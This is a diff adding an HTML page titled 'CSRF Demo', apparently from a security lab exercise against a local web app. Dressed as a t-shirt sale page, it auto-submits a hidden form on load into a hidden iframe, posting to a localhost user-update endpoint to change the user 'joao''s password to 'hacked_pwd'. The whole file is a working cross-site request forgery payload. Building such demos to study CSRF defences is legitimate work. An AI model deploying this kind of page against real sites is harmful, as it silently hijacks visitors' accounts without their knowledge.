@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<head>
+	<title>CSRF Demo</title>
+	<meta charset="utf-8"> 
+</head>
+<body onload="document.hackform.submit()">
+	<h1> TSHIRT - 10$</h1>
+	<img src="https://static.massimodutti.net/3/photos//2023/I/0/1/p/6866/772/250/6866772250_1_1_16.jpg?t=1673426037680&impolicy=massimodutti-itxmediumhigh&imwidth=500&imformat=chrome">
+	<iframe name="hide" style="display:none"></iframe>
+
+	<form target="hide" method="post" name="hackform" action="http://127.0.0.1:5000/userinfo/update">
+		<!-- This is exclusively targeted to the user joao-->
+		<input name="username" type="hidden" id="username" value="joao" required>	
+		<input name="email" type="hidden" id="email" value="">
+		<input name="password" type = "hidden" id="password" value="hacked_pwd">
+		<input name="confirm_password" type = "hidden" id="confirm_password" value="hacked_pwd">
+	</form>
+</body>
